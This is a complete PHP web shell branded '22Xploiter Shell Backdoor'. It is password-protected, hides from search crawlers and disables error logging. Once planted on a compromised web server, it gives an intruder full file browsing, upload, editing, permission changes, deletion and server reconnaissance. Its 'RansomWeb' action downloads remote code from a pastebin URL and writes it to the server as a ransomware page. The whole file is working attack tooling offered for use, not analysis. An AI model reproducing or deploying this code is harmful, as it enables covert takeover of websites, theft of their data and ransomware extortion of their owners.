<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; // admin
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<title>22XploiterCrew</title>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="author" content="CodeXploit"/>
		<meta name="copyright" content="22XploiterCrew"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
	</head>
	<body class="bg-dark text-light">
		<center>
			<br/><h3>22Xploiter Shell Backdoor</h3><hr/><br/>
			<div class="container">
				<div class="col-lg-6">
					<div class="form-group">
					<h5> Silahkan Masuk</h5>
					<br/>
						<form method="post">
							<input type="password" name="pass" placeholder="Password" class="form-control"><br/>
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
						</form>
					</div>
				</div><br/>
			</div>
		</center>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
		<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
  <!-- Custom styles for this template -->
  <style>
body {
  overflow-x: hidden;
}
.ico {width:20px;}
.ico2{width:20px;}
#sidebar-wrapper {
  min-height: 100vh;
  margin-left: -15rem;
  -webkit-transition: margin .25s ease-out;
  -moz-transition: margin .25s ease-out;
  -o-transition: margin .25s ease-out;
  transition: margin .25s ease-out;
}

#sidebar-wrapper .sidebar-heading {
  padding: 0.875rem 1.25rem;
  font-size: 1.2rem;
}

#sidebar-wrapper .list-group {
  width: 15rem;
}

#page-content-wrapper {
  min-width: 100vw;
}

#wrapper.toggled #sidebar-wrapper {
  margin-left: 0;
}

@media (min-width: 768px) {
  #sidebar-wrapper {
    margin-left: 0;
  }

  #page-content-wrapper {
    min-width: 0;
    width: 100%;
  }

  #wrapper.toggled #sidebar-wrapper {
    margin-left: -15rem;
  }
}
  </style>
</head>
<body>

 
    <!-- /#sidebar-wrapper -->

    <!-- Page Content -->
    <div id="page-content-wrapper">

      <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
        <button class="btn btn-primary" id="menu-toggle"><i class="fa fa-user"></i></button>

        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarSupportedContent">
          <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
            <li class="nav-item active">
              <a class="nav-link" href="?">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
             
<?php
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach( $paths as $id => $pat ){
if( $pat == '' && $id == 0 ){
$a = true;
echo 'Current Dir => <a href="?path=/">/</a>';
continue;
}
if( $pat == '' ) continue;
echo '<a href="?path=';
for( $i = 0; $i <= $id; $i++){
echo "$paths[$i]";
if( $i != $id ) echo "/";
}
echo '">'.$pat.'</a>/';
}
?>
             
            </li>
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Informasi & Upload
              </a>
              <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
                <a class="dropdown-item" href="?info">Info Server</a>
                <div class="dropdown-divider"></div>
                <center>
               <form method="post" enctype="multipart/form-data">
               	<input type="file" name="file"><input type="submit" name="upload" value="Upload">
               </form>
               </center>
              </div>
            </li>
          </ul>
        </div>
      </nav>
 <div class="d-flex" id="wrapper">
    <!-- Sidebar -->
    <div class="bg-light border-right" id="sidebar-wrapper">
      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> 22XploiterCrew</a></div>
      <div class="list-group list-group-flush">
      	<?php
      	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Buat Folder</a>
      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>
      	<a href='?path=$path&aksi=ransom' class='list-group-item list-group-item-action bg-light'><i class='fa fa-exclamation-triangle'></i> RansomWeb</a>";
      	?>
        <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> Logout</a>
        
      </div>
    </div>
      <div class="container-fluid">
        
        
<?php
if($_GET["keluar"] == true){
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
if($_GET['aksi'] == 'buatfolder'){
	function hai(){
		echo "<script>window.location='?path=".$path."'; alert('Folder Sukses Dibuat!')</script>";
	}
	if(isset($_POST["folderss"])){
		$nama_folder = $path.'/'.$_POST["namaF"];
		mkdir($nama_folder,hai());
	}
		
	echo '
	<div class="row mt-3">
		<div class="col">
			<form method="post">
	<input type="text" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
		</div>
		<div class="col">
			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
				</div>
				</div>';
}elseif($_GET["aksi"] == 'ransom'){
	
	
// Ubah Link ransomnya jika ingin ganti ransomware yangvlain
	$url  = "https://pastebin.com/raw/LbVhNnZF";
  $curl = curl_init($url);
  				curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
  $get	= curl_exec($curl);
 if(!$get == ""){ // Jika isi file dari url tidak kosong
// Buat file
$puts = fopen("RansomWeb.php","w");
				fwrite($puts,$get);
				fclose($puts);
$nama_file  = "RansomWeb.php";
$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
if($puts == true){
	echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
}else{
	echo "Gagal Membuat File";
	}
}else{
	echo "Not Found!!";
}

	
}elseif($_GET["aksi"] == 'buatfile'){
	if(isset($_POST["buat"])){
	$namaF = $path.'/'.$_POST["nama_file"];
	$isi = $_POST["isi"];
	$buat = fopen($namaF,"w");
	fwrite($buat,$isi);
	fclose($buat);
	if($buat == TRUE){
		echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
}
echo '<form method="post" class="mt-3">
	<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
		<textarea class="form-control mb-3" rows="8" name="isi" placeholder="Isi File"></textarea>
		<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">';
}else

// Informasi Server

if(isset($_GET["info"])){
echo '
	<div class="alert alert-success mt-3">
		<h3 class="text-center">Informasi Server</h3><hr>
		<li>Nama Server : '.$_SERVER["SERVER_NAME"].'</li>
		<li>Ip Address : '.$_SERVER["SERVER_ADDR"].'</li>
		<li>Port : '.$_SERVER["SERVER_PORT"].'</li>
		<li>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</li>
		<li>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</li>
		<li>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</li>
		<li>Software : '.$_SERVER["SERVER_SOFTWARE"].'</li>
		<li>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</li>
		<li>G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].'</li>
		<li>R-Method : '.$_SERVER["REQUEST_METHOD"].'</li>
		<li>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</li>
		</div>';
}else if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo "<script>window.location='?path=".$path."'; alert('Valid!!')</script>";
}else{
echo "<script>alert('Gagal Upload')</script>";
}
}else if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}else if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
}
echo '<form method="POST">
	<div class="row">
		<div class="col">
<input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" class="form-control">
	</div>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
	<div class="col">
<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
	</div>
	</div>
</form>';
}else if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo "<script>window.location='?path=".$path."'; alert('Nama Telah Diubah!')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
	<div class="row">
		<div class="col">
<input name="newname" type="text" size="20" value="'.$_POST['name'].'" class="form-control" placeholder="Nama Baru">
	</div>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
	<div class="col">
<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
</div>
</div>
</form>';
}else if($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo "<script>window.location='?path=".$path."'; alert('Berhasil Merubah Nama File')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="form-control" rows="8" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Simpan" class="btn btn-outline-primary btn-block mt-3">
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus Folder')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
}else if($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus File')</script>";
}else{
echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '
<div class="table-responsive-lg mt-2">
	<table class="table table-hover">
		<thead class="bg-warning text-center">
			<tr>
				<th scope="col">Nama</th>
				<th scope="col">Jenis</th>
				<th scope="col">Ukuran</th>
				<th scope="col">Perizinan</th>
				<th scope="col">Aksi</th></tr></thead>
	';
	foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td scope="col"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td class="text-center">Folder</td>
<td class="text-center">--</td>
<td class="text-center">';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</td>
<td class="text-center"><form method="POST" action="?option&path='.$path.'">
	<div class="row">
		<div class="col">
<select name="opt" class="custom-select">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
</div>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
	<div class="col">
<input type="submit" value=">" class="btn btn-outline-primary btn-block">
	</div>
	</div>
</form></td>
</tr>';
}
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src="';
					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
					if($ext == "php") {
						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
					}elseif ($ext == "html") {
						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
					}elseif ($ext == "css") {
						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
					}elseif ($ext == "png") {
						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
					}elseif ($ext == "jpg") {
						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
					}elseif ($ext == "jpeg") {
						echo 'http://i.imgur.com/e8mkvPf.png"';
					}elseif($ext == "zip") {
						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
					}elseif ($ext == "js") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
					}elseif ($ext == "ttf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
					}elseif ($ext == "otf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
					}elseif ($ext == "txt") {
						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
					}elseif ($ext == "ico") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
					}elseif ($ext == "conf") {
						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
					}elseif ($ext == "htaccess") {
						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
					}elseif ($ext == "sh") {
						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
					}elseif ($ext == "py") {
						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
					}elseif ($ext == "sql") {
						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
					}elseif ($ext == "pl") {
						echo 'http://i.imgur.com/PnmX8H9.png';
					}elseif ($ext == "pdf") {
						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
					}elseif ($ext == "mp4") {
						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
					}elseif ($ext == "mp3") {
						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
					}elseif ($ext == "git") {
						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
					}elseif ($ext == "md") {
						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
					}else{
						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
					}
					echo '" class="ico2"> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td class="text-center">File</td>
<td class="text-center">'.$size.'</td>
<td class="text-center">';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</td>
<td class="text-center">
	<form method="POST" action="?option&path='.$path.'">
		<div class="row">
			<div class="col">
<select name="opt" class="custom-select">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
</div>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
	<div class="col">
<input type="submit" value="OK" class="btn btn-outline-primary btn-block">
	</div>
	</div>
</form></td>
</tr>';
}
echo '</table>
</div>';
}
?>
        
        
      </div>
    </div>
    <!-- /#page-content-wrapper -->
  </div>
  <!-- /#wrapper -->

  <!-- Bootstrap core JavaScript -->
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

  <!-- Menu Toggle Script -->
  <script>
    $("#menu-toggle").click(function(e) {
      e.preventDefault();
      $("#wrapper").toggleClass("toggled");
    });
  </script>

</body>
</html>
<?php
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
